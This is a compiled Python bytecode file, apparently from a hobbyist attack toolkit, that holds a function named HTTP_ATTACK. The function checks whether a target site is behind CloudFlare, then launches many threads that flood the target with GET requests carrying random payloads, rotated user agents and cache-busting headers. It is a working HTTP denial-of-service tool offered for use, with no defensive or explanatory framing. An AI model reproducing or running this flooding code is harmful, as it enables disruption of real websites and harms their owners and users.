a
    Ov?a?  ?                   @   sH   d dl Z d dlZd dlZd dlmZ d dlmZ d dlmZ dd? Z	dS )?    N)?Threadc                    s?   da t?? ?r2td? td??d??? dkr2t?  td? g }g ?t| ?D ]}??	t
?? ? qJ? ?fdd?}td	| ?D ]4}td
t|? d ? t|d?}|??  |?	|? qvt?|? |D ]}da |??  q?td? d S )NFz8[1;33m[!][0m This site is under CloudFlare protection.z,[1;77m[?][0m Continue HTTP attack? (y/n): ? ?yz&[1;34m[*][0m Starting HTTP attack...c               
      s?   t rq?tt?t?dd???} dddddt???d?}ztj? | d?}W n6 ty| } zt	|? t
?d	? W Y d }~q d }~0 0 t	d
tt| ?? d ? q d S )N?   ?   ZXMLHttpRequestz
keep-alivezno-cachezgzip, deflate, br)zX-Requested-WithZ
ConnectionZPragmazCache-ControlzAccept-Encodingz
User-agent)?params?   z%[1;32m[+][0m HTTP packet with size z
 was sent!)?FINISH?str?random?_urandom?randint?choice?requests?get?	Exception?print?time?sleep?len)ZpayloadZheaders?r?e??targetZuser_agents? ?3/storage/emulated/0/Script Vip/toolso/other/http.py?
http_flood   s     ? zHTTP_ATTACK.<locals>.http_floodr   z[1;34m[*][0m Staring thread z...)r   Tz [1;77m[i][0m Attack completed.)r	   ?ipToolsZisCloudFlarer   ?input?strip?lower?exit?range?append?
randomDataZrandom_useragentr
   r   ?startr   r   ?join)ZthreadsZattack_timer   Zthreads_list?_r   ?thread?tr   r   r   ?HTTP_ATTACK   s*    



r*   )
r   r   r   Z	threadingr   Ztoolso.randomDatar$   Ztoolso.ipToolsr   r*   r   r   r   r   ?<module>   s   